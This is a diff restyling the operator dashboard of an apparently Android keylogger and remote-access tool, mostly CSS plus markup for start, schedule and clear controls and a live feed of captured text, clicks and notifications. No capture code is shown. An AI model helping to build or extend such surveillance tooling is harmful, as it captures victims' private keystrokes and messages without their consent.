@@ -3,231 +3,180 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Keylogger - Remote Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
 
         body {
-            font-family: 'Share Tech Mono', monospace;
-            background: #0a0e17;
-            color: #c8c8c8;
+            padding: 0;
             min-height: 100vh;
+            font-family: var(--font-display) !important;
         }
 
-        .top-bar {
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 12px 20px;
-            background: rgba(10, 14, 23, 0.95);
-            border-bottom: 1px solid rgba(0, 255, 65, 0.15);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            padding: 16px 22px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .top-bar h1 {
-            font-size: 14px;
-            letter-spacing: 2px;
-            color: #00ff41;
+        .pg-header::after {
+            display: none;
         }
 
-        .top-bar-actions {
+        .pg-header-left {
             display: flex;
-            gap: 8px;
             align-items: center;
+            gap: 14px;
         }
 
-        .btn {
-            padding: 6px 16px;
-            border: 1px solid rgba(0, 255, 65, 0.3);
-            background: rgba(0, 255, 65, 0.08);
-            color: #00ff41;
-            font-family: inherit;
-            font-size: 11px;
-            border-radius: 4px;
+        .pg-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.04));
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.08);
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e8e8e8;
+        }
+
+        .pg-title span {
+            color: var(--accent);
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .pg-sub {
+            font-family: var(--font-mono);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .hdr-actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .hdr-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 8px;
             cursor: pointer;
             transition: all 0.2s;
-            letter-spacing: 1px;
         }
 
-        .btn:hover {
-            background: rgba(0, 255, 65, 0.2);
+        .hdr-btn:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
         }
 
-        .btn-danger {
-            border-color: rgba(255, 60, 60, 0.3);
-            background: rgba(255, 60, 60, 0.08);
-            color: #ff4444;
+        .hdr-btn.active {
+            background: rgba(0, 255, 65, 0.15);
+            border-color: rgba(0, 255, 65, 0.35);
+            color: var(--accent);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.15);
         }
 
-        .btn-danger:hover {
-            background: rgba(255, 60, 60, 0.2);
+        .hdr-btn.danger {
+            color: var(--danger);
+            border-color: rgba(255, 51, 51, 0.15);
         }
 
-        .btn-active {
-            background: rgba(0, 255, 65, 0.25);
-            box-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        .hdr-btn.danger:hover {
+            background: rgba(255, 51, 51, 0.06);
+            border-color: rgba(255, 51, 51, 0.25);
         }
 
-        .btn-schedule {
+        .hdr-btn.schedule {
+            color: #0cf;
+            border-color: rgba(0, 200, 255, 0.15);
+        }
+
+        .hdr-btn.schedule:hover {
+            background: rgba(0, 200, 255, 0.06);
+            border-color: rgba(0, 200, 255, 0.25);
+        }
+
+        .hdr-btn.schedule.has-apps {
+            background: rgba(0, 200, 255, 0.12);
             border-color: rgba(0, 200, 255, 0.3);
-            background: rgba(0, 200, 255, 0.08);
-            color: #0cf;
+            box-shadow: 0 0 10px rgba(0, 200, 255, 0.12);
         }
 
-        .btn-schedule:hover {
-            background: rgba(0, 200, 255, 0.2);
-        }
-
-        .btn-schedule.has-apps {
-            background: rgba(0, 200, 255, 0.2);
-            box-shadow: 0 0 10px rgba(0, 200, 255, 0.2);
-        }
-
-        .btn-back {
-            text-decoration: none;
-            border-color: rgba(255, 255, 255, 0.1);
-            background: rgba(255, 255, 255, 0.04);
-            color: #888;
-        }
-
-        /* Stats */
-        .stats-row {
-            display: flex;
-            gap: 12px;
-            padding: 12px 20px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            flex-wrap: wrap;
-        }
-
-        .stat-card {
-            flex: 1;
-            min-width: 100px;
-            padding: 10px 14px;
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 6px;
-        }
-
-        .stat-label {
-            font-size: 9px;
-            color: #555;
-            letter-spacing: 1px;
-        }
-
-        .stat-value {
-            font-size: 18px;
-            color: #00ff41;
-            margin-top: 2px;
-        }
-
-        .stat-value.danger {
-            color: #ff4444;
-        }
-
-        .stat-value.warn {
-            color: #ffa500;
-        }
-
-        .stat-value.purple {
-            color: #c864ff;
-        }
-
-        .stat-value.cyan {
-            color: #0cf;
-        }
-
-        /* Filter & schedule row */
-        .filter-row {
-            display: flex;
-            gap: 8px;
-            padding: 8px 20px;
-            align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            flex-wrap: wrap;
-        }
-
-        .filter-row select,
-        .filter-row input[type="text"] {
-            padding: 5px 10px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            color: #c8c8c8;
-            font-family: inherit;
-            font-size: 11px;
-        }
-
-        .filter-row input:focus,
-        .filter-row select:focus {
-            outline: none;
-            border-color: rgba(0, 255, 65, 0.4);
-        }
-
-        .scheduled-badges {
-            display: flex;
-            gap: 6px;
-            flex-wrap: wrap;
-            align-items: center;
-        }
-
-        .scheduled-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            padding: 3px 8px;
-            background: rgba(0, 200, 255, 0.1);
-            border: 1px solid rgba(0, 200, 255, 0.25);
-            border-radius: 10px;
-            font-size: 9px;
-            color: #0cf;
-        }
-
-        .scheduled-badge .remove-badge {
-            cursor: pointer;
-            color: #ff4444;
-            font-size: 10px;
-        }
-
-        .scheduled-badge .remove-badge:hover {
-            color: #ff6666;
-        }
-
-        /* Status */
+        /* ── STATUS BADGE ── */
         .status-badge {
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            padding: 4px 10px;
-            border-radius: 12px;
-            font-size: 10px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
         }
 
-        .status-badge.active {
-            background: rgba(0, 255, 65, 0.15);
-            color: #00ff41;
-            border: 1px solid rgba(0, 255, 65, 0.3);
+        .status-badge.active-badge {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent);
+            border: 1px solid rgba(0, 255, 65, 0.2);
         }
 
         .status-badge.inactive {
-            background: rgba(255, 255, 255, 0.05);
-            color: #666;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.03);
+            color: var(--text-muted);
+            border: 1px solid var(--border);
         }
 
         .pulse-dot {
             width: 6px;
             height: 6px;
             border-radius: 50%;
-            background: #00ff41;
+            background: var(--accent);
             animation: pulse 1.5s ease-in-out infinite;
         }
 
@@ -245,10 +194,175 @@
             }
         }
 
-        /* Log feed */
+        /* ── STATS ── */
+        .stats-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            flex: 1;
+            min-width: 90px;
+            padding: 12px 16px;
+            background: var(--bg-card);
+            border: none;
+            border-radius: 8px;
+        }
+
+        .stat-card::before {
+            display: none;
+        }
+
+        .stat-label {
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .stat-value {
+            font-family: var(--font-display);
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--accent);
+            margin-top: 2px;
+        }
+
+        .stat-value.danger {
+            color: var(--danger);
+        }
+
+        .stat-value.warn {
+            color: var(--warning);
+        }
+
+        .stat-value.purple {
+            color: #c864ff;
+        }
+
+        .stat-value.cyan {
+            color: #0cf;
+        }
+
+        /* ── FILTER BAR ── */
+        .filter-bar {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            padding: 12px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .filter-bar select,
+        .filter-bar input[type="text"] {
+            padding: 6px 12px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .filter-bar input:focus,
+        .filter-bar select:focus {
+            border-color: rgba(0, 255, 65, 0.3);
+        }
+
+        .filter-bar input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .auto-scroll-label {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-left: auto;
+        }
+
+        .auto-scroll-label input {
+            accent-color: var(--accent);
+        }
+
+        /* ── SCHEDULED BADGES ── */
+        .sched-row {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            padding: 10px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .sched-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 600;
+            color: #0cf;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .scheduled-badges {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .scheduled-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 3px 10px;
+            background: rgba(0, 200, 255, 0.06);
+            border: 1px solid rgba(0, 200, 255, 0.18);
+            border-radius: 20px;
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 500;
+            color: #0cf;
+        }
+
+        .scheduled-badge .remove-badge {
+            cursor: pointer;
+            color: var(--danger);
+            font-size: 10px;
+            transition: color 0.15s;
+        }
+
+        .scheduled-badge .remove-badge:hover {
+            color: #ff6666;
+        }
+
+        /* ── LOG FEED ── */
+        .feed-wrap {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
         .feed-container {
-            padding: 8px 20px;
-            max-height: calc(100vh - 260px);
+            padding: 0;
+            max-height: 60vh;
             overflow-y: auto;
         }
 
@@ -261,18 +375,25 @@
         }
 
         .feed-container::-webkit-scrollbar-thumb {
-            background: rgba(0, 255, 65, 0.2);
+            background: rgba(0, 255, 65, 0.12);
             border-radius: 2px;
         }
 
         .log-entry {
             display: flex;
-            gap: 8px;
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-            font-size: 11px;
+            gap: 10px;
+            padding: 7px 14px;
+            border-bottom: 1px solid var(--border);
             animation: fadeIn 0.2s ease;
             align-items: flex-start;
+        }
+
+        .log-entry:last-child {
+            border-bottom: none;
+        }
+
+        .log-entry:hover {
+            background: rgba(0, 255, 65, 0.02);
         }
 
         @keyframes fadeIn {
@@ -288,97 +409,99 @@
         }
 
         .log-time {
-            color: #444;
+            color: var(--text-muted);
             flex-shrink: 0;
             min-width: 65px;
-            font-size: 10px;
+            font-family: var(--font-mono);
+            font-size: 0.6rem;
         }
 
         .log-type {
             flex-shrink: 0;
             min-width: 80px;
-            padding: 1px 6px;
-            border-radius: 3px;
-            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 600;
             text-align: center;
-            letter-spacing: 0.5px;
-            font-weight: bold;
+            letter-spacing: 0.3px;
         }
 
         .type-text_changed {
-            background: rgba(0, 255, 65, 0.15);
-            color: #00ff41;
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent);
         }
 
         .type-click {
-            background: rgba(0, 150, 255, 0.15);
+            background: rgba(0, 150, 255, 0.1);
             color: #0096ff;
         }
 
         .type-long_click {
-            background: rgba(0, 100, 200, 0.2);
+            background: rgba(0, 100, 200, 0.12);
             color: #0064c8;
         }
 
         .type-focus {
-            background: rgba(255, 165, 0, 0.15);
-            color: #ffa500;
+            background: rgba(255, 165, 0, 0.1);
+            color: var(--warning);
         }
 
         .type-scroll {
-            background: rgba(170, 100, 255, 0.15);
+            background: rgba(170, 100, 255, 0.1);
             color: #aa64ff;
         }
 
         .type-window_change {
-            background: rgba(0, 220, 255, 0.15);
+            background: rgba(0, 220, 255, 0.1);
             color: #0cf;
         }
 
         .type-app_switch {
-            background: rgba(0, 220, 255, 0.25);
+            background: rgba(0, 220, 255, 0.15);
             color: #0cf;
-            font-weight: bold;
+            font-weight: 700;
         }
 
         .type-content_change {
-            background: rgba(255, 255, 100, 0.1);
+            background: rgba(255, 255, 100, 0.06);
             color: #aa9900;
         }
 
         .type-selection {
-            background: rgba(255, 100, 200, 0.15);
+            background: rgba(255, 100, 200, 0.1);
             color: #ff64c8;
         }
 
         .type-text_selection {
-            background: rgba(255, 150, 200, 0.15);
+            background: rgba(255, 150, 200, 0.1);
             color: #ffaacc;
         }
 
         .type-notification {
-            background: rgba(255, 200, 0, 0.15);
+            background: rgba(255, 200, 0, 0.1);
             color: #ffcc00;
         }
 
         .type-schedule_start {
-            background: rgba(0, 255, 100, 0.2);
+            background: rgba(0, 255, 100, 0.12);
             color: #00ff65;
         }
 
         .type-schedule_stop {
-            background: rgba(255, 60, 60, 0.15);
-            color: #ff4444;
+            background: rgba(255, 60, 60, 0.1);
+            color: var(--danger);
         }
 
         .type-announcement {
-            background: rgba(200, 200, 200, 0.1);
-            color: #888;
+            background: rgba(200, 200, 200, 0.06);
+            color: var(--text-muted);
         }
 
         .type-other {
-            background: rgba(100, 100, 100, 0.1);
-            color: #666;
+            background: rgba(100, 100, 100, 0.06);
+            color: var(--text-muted);
         }
 
         .log-app {
@@ -389,33 +512,48 @@
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
-            font-size: 10px;
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 500;
         }
 
         .log-text {
-            color: #ddd;
+            color: var(--text-primary);
             word-break: break-all;
             flex: 1;
-            font-size: 11px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
         }
 
-        .empty-state {
+        /* ── EMPTY STATE ── */
+        .empty {
             text-align: center;
-            padding: 60px 20px;
-            color: #444;
+            padding: 60px 24px;
+            color: var(--text-muted);
         }
 
-        .empty-state h2 {
-            font-size: 16px;
-            margin-bottom: 8px;
+        .empty .e-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            opacity: 0.3;
         }
 
-        .empty-state p {
-            font-size: 11px;
-            color: #333;
+        .empty h2 {
+            font-family: var(--font-display);
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
         }
 
-        /* Schedule Modal */
+        .empty p {
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+        }
+
+        /* ── SCHEDULE MODAL ── */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -423,10 +561,11 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.75);
             z-index: 200;
             align-items: center;
             justify-content: center;
+            backdrop-filter: blur(4px);
         }
 
         .modal-overlay.visible {
@@ -434,9 +573,9 @@
         }
 
         .modal {
-            background: #0e1320;
-            border: 1px solid rgba(0, 200, 255, 0.25);
-            border-radius: 8px;
+            background: var(--bg-panel);
+            border: 1px solid rgba(0, 200, 255, 0.2);
+            border-radius: 10px;
             width: 90%;
             max-width: 500px;
             max-height: 80vh;
@@ -450,46 +589,58 @@
             justify-content: space-between;
             align-items: center;
             padding: 14px 18px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            border-bottom: 1px solid var(--border);
         }
 
         .modal-header h2 {
-            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.8rem;
+            font-weight: 600;
             letter-spacing: 1px;
             color: #0cf;
         }
 
         .modal-close {
             cursor: pointer;
-            color: #666;
-            font-size: 18px;
+            color: var(--text-muted);
             background: none;
             border: none;
+            display: flex;
+            align-items: center;
+            transition: color 0.2s;
         }
 
         .modal-close:hover {
-            color: #fff;
+            color: var(--text-primary);
         }
 
         .modal-search {
             padding: 8px 18px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            border-bottom: 1px solid var(--border);
         }
 
         .modal-search input {
             width: 100%;
             padding: 8px 12px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            color: #c8c8c8;
-            font-family: inherit;
-            font-size: 11px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            outline: none;
+            transition: border-color 0.2s;
         }
 
         .modal-search input:focus {
-            outline: none;
-            border-color: rgba(0, 200, 255, 0.4);
+            border-color: rgba(0, 200, 255, 0.3);
+        }
+
+        .modal-search input::placeholder {
+            color: var(--text-muted);
         }
 
         .modal-body {
@@ -503,7 +654,7 @@
         }
 
         .modal-body::-webkit-scrollbar-thumb {
-            background: rgba(0, 200, 255, 0.2);
+            background: rgba(0, 200, 255, 0.12);
             border-radius: 2px;
         }
 
@@ -517,11 +668,11 @@
         }
 
         .app-item:hover {
-            background: rgba(0, 200, 255, 0.06);
+            background: rgba(0, 200, 255, 0.04);
         }
 
         .app-item.selected {
-            background: rgba(0, 200, 255, 0.1);
+            background: rgba(0, 200, 255, 0.08);
         }
 
         .app-item input[type="checkbox"] {
@@ -529,14 +680,17 @@
         }
 
         .app-name {
-            color: #c8c8c8;
-            font-size: 11px;
+            color: var(--text-primary);
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
             flex: 1;
         }
 
         .app-pkg {
-            color: #555;
-            font-size: 9px;
+            color: var(--text-muted);
+            font-family: var(--font-display);
+            font-size: 0.55rem;
         }
 
         .modal-footer {
@@ -544,99 +698,387 @@
             justify-content: space-between;
             align-items: center;
             padding: 12px 18px;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            border-top: 1px solid var(--border);
             gap: 8px;
         }
 
         .modal-footer .selected-count {
-            font-size: 10px;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
             color: #0cf;
+        }
+
+        .modal-footer .hdr-btn {
+            padding: 6px 12px;
+            font-size: 0.65rem;
         }
 
         .modal-loading {
             text-align: center;
             padding: 40px;
-            color: #555;
-            font-size: 11px;
+            color: var(--text-muted);
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+        }
+
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 28px;
+            padding: 16px 20px;
+            background: rgba(255, 170, 0, 0.03);
+            border: 1px solid rgba(255, 170, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--warning);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 32px 16px;
+            margin-top: 28px;
+            border-top: 1px solid var(--border);
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 8px rgba(0, 255, 65, 0.2));
+            transition: all 0.4s ease;
+        }
+
+        .ft .ft-brand:hover {
+            filter: drop-shadow(0 0 16px rgba(0, 255, 65, 0.4));
+            animation: brandShine 1.5s ease infinite;
+        }
+
+        @keyframes brandShine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-mono);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .wrap {
+                padding: 10px;
+            }
+
+            .pg-header {
+                padding: 12px 16px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .pg-icon {
+                width: 36px;
+                height: 36px;
+            }
+
+            .pg-title {
+                font-size: 0.9rem;
+            }
+
+            .stats-row {
+                gap: 8px;
+            }
+
+            .stat-card {
+                min-width: 80px;
+                padding: 10px 12px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .pg-sub {
+                display: none;
+            }
+
+            .stat-card {
+                min-width: 70px;
+                padding: 8px 10px;
+            }
+
+            .stat-value {
+                font-size: 1rem;
+            }
+
+            .log-app {
+                display: none;
+            }
+
+            .filter-bar {
+                gap: 6px;
+                padding: 10px 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hdr-btn .lbl {
+                display: none;
+            }
+
+            .stat-card {
+                min-width: 60px;
+                padding: 6px 8px;
+            }
+
+            .stat-label {
+                font-size: 0.45rem;
+            }
+
+            .stat-value {
+                font-size: 0.9rem;
+            }
+
+            .log-type {
+                min-width: 60px;
+                font-size: 0.48rem;
+            }
+
+            .log-time {
+                min-width: 50px;
+                font-size: 0.55rem;
+            }
+
+            .log-text {
+                font-size: 0.6rem;
+            }
+
+            .disc {
+                padding: 12px 14px;
+            }
+
+            .ft {
+                padding: 24px 12px;
+                margin-top: 20px;
+            }
+
+            .ft .ft-brand {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .wrap {
+                padding: 8px;
+            }
+
+            .pg-header {
+                padding: 10px 12px;
+            }
+
+            .pg-icon {
+                width: 30px;
+                height: 30px;
+            }
+
+            .pg-title {
+                font-size: 0.85rem;
+            }
+
+            .stats-row {
+                gap: 6px;
+            }
+
+            .stat-card {
+                padding: 5px 6px;
+                border-radius: 6px;
+            }
+
+            .disc {
+                padding: 10px 12px;
+                border-radius: 8px;
+            }
+
+            .ft .ft-brand {
+                font-size: 0.85rem;
+                letter-spacing: 2px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <!-- TOP BAR -->
-    <div class="top-bar">
-        <h1>&#x2328; KEYLOGGER</h1>
-        <div class="top-bar-actions">
-            <span class="status-badge inactive" id="status-badge">
-                <span>STOPPED</span>
-            </span>
-            <button class="btn" id="btn-start" onclick="toggleCapture()">&#x25B6; START</button>
-            <button class="btn btn-schedule" id="btn-schedule" onclick="openScheduleModal()">&#x1F4C5; SCHEDULE</button>
-            <button class="btn btn-danger" id="btn-clear" onclick="clearLogs()">&#x1F5D1; CLEAR</button>
-            <a href="index.html" class="btn btn-back">&larr; BACK</a>
+    <div class="wrap">
+
+        <!-- HEADER -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon"><i data-lucide="keyboard" style="width:20px;height:20px;"></i></div>
+                <div>
+                    <div class="pg-title"><span>Key</span>logger</div>
+                    <div class="pg-sub">// accessibility event capture</div>
+                </div>
+            </div>
+            <div class="hdr-actions">
+                <span class="status-badge inactive" id="status-badge">
+                    <span>STOPPED</span>
+                </span>
+                <button class="hdr-btn" id="btn-start" onclick="toggleCapture()">
+                    <i data-lucide="play" style="width:14px;height:14px;"></i>
+                    <span class="lbl">Start</span>
+                </button>
+                <button class="hdr-btn schedule" id="btn-schedule" onclick="openScheduleModal()">
+                    <i data-lucide="calendar" style="width:14px;height:14px;"></i>
+                    <span class="lbl">Schedule</span>
+                </button>
+                <button class="hdr-btn danger" id="btn-clear" onclick="clearLogs()">
+                    <i data-lucide="trash-2" style="width:14px;height:14px;"></i>
+                    <span class="lbl">Clear</span>
+                </button>
+                <a href="index.html" class="hdr-btn">
+                    <i data-lucide="arrow-left" style="width:14px;height:14px;"></i>
+                    <span class="lbl">Dashboard</span>
+                </a>
+            </div>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats-row">
+            <div class="stat-card">
+                <div class="stat-label">Text Events</div>
+                <div class="stat-value" id="stat-text">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Clicks</div>
+                <div class="stat-value cyan" id="stat-clicks">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Scrolls</div>
+                <div class="stat-value purple" id="stat-scrolls">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Unique Apps</div>
+                <div class="stat-value warn" id="stat-apps">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Total Events</div>
+                <div class="stat-value" id="stat-total">0</div>
+            </div>
+        </div>
+
+        <!-- Scheduled apps row -->
+        <div class="sched-row" id="schedule-row" style="display:none;">
+            <span class="sched-label">Scheduled:</span>
+            <div class="scheduled-badges" id="scheduled-badges"></div>
+        </div>
+
+        <!-- FILTER BAR -->
+        <div class="filter-bar">
+            <select id="filter-type" onchange="renderFeed()">
+                <option value="all">All Events</option>
+                <option value="text_changed">Text Changes</option>
+                <option value="click">Clicks</option>
+                <option value="scroll">Scrolls</option>
+                <option value="focus">Focus</option>
+                <option value="window_change">Window Changes</option>
+                <option value="app_switch">App Switches</option>
+                <option value="content_change">Content Changes</option>
+                <option value="selection">Selections</option>
+                <option value="long_click">Long Clicks</option>
+                <option value="notification">Notifications</option>
+            </select>
+            <input type="text" id="filter-text" placeholder="Search text..." oninput="renderFeed()">
+            <label class="auto-scroll-label">
+                <input type="checkbox" id="auto-scroll" checked> Auto-scroll
+            </label>
+        </div>
+
+        <!-- FEED -->
+        <div class="feed-wrap">
+            <div class="feed-container" id="feed"></div>
+        </div>
+
+        <!-- DISCLAIMER -->
+        <div class="disc">
+            <h4><i data-lucide="alert-triangle" style="width:13px;height:13px;"></i> Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. Installing or using this on a device
+                without the owner's explicit consent is illegal and unethical.</p>
         </div>
     </div>
 
-    <!-- STATS -->
-    <div class="stats-row">
-        <div class="stat-card">
-            <div class="stat-label">TEXT EVENTS</div>
-            <div class="stat-value" id="stat-text">0</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">CLICKS</div>
-            <div class="stat-value cyan" id="stat-clicks">0</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">SCROLLS</div>
-            <div class="stat-value purple" id="stat-scrolls">0</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">UNIQUE APPS</div>
-            <div class="stat-value warn" id="stat-apps">0</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">TOTAL EVENTS</div>
-            <div class="stat-value" id="stat-total">0</div>
-        </div>
-    </div>
-
-    <!-- Scheduled apps row -->
-    <div class="filter-row" id="schedule-row" style="display:none;">
-        <span style="font-size:10px;color:#0cf;letter-spacing:1px;">SCHEDULED:</span>
-        <div class="scheduled-badges" id="scheduled-badges"></div>
-    </div>
-
-    <!-- FILTER ROW -->
-    <div class="filter-row">
-        <select id="filter-type" onchange="renderFeed()">
-            <option value="all">All Events</option>
-            <option value="text_changed">Text Changes</option>
-            <option value="click">Clicks</option>
-            <option value="scroll">Scrolls</option>
-            <option value="focus">Focus</option>
